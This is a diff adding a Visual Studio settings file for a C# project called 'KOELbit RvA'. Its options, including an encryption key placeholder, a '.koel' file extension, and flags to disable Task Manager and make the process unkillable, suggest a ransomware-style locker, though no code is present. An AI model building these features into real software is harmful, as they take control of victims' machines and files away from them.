@@ -1,0 +1,36 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="KOELbit.Properties" GeneratedClassName="Settings">
+  <Profiles />
+  <Settings>
+    <Setting Name="key" Type="System.String" Scope="User">
+      <Value Profile="(Default)">yoursimplekey</Value>
+    </Setting>
+    <Setting Name="extension" Type="System.String" Scope="User">
+      <Value Profile="(Default)">.koel</Value>
+    </Setting>
+    <Setting Name="debug" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="application_title" Type="System.String" Scope="User">
+      <Value Profile="(Default)">KOELbit RvA</Value>
+    </Setting>
+    <Setting Name="disable_taskmgr" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="clickMouse" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="message" Type="System.String" Scope="User">
+      <Value Profile="(Default)">&lt;h1&gt;Github:&lt;/h1&gt;&lt;p&gt;raselmandol/KOELbitRvA&lt;/p&gt;</Value>
+    </Setting>
+    <Setting Name="unkillable" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="application_name" Type="System.String" Scope="User">
+      <Value Profile="(Default)">KOELbit RvA</Value>
+    </Setting>
+    <Setting Name="theme" Type="System.String" Scope="User">
+      <Value Profile="(Default)">flash</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
